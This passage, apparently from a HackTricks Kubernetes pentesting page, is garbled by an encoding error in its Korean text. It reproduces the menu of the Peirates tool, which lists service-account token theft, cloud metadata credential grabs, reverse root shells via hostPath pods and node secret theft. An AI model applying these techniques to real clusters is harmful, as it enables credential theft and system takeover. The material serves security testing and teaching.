[**ìì„¸í•œ ì •ë³´ëŠ” ì´ ë§í¬ë¥¼ ì°¸ì¡°í•˜ì„¸ìš”**](abusing-roles-clusterroles-in-kubernetes/#delete-pods-+-unschedulable-nodes).

## ìë™ ë„êµ¬

* [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)
```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```
* [**https://github.com/r0binak/MTKPI**](https://github.com/r0binak/MTKPI)

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
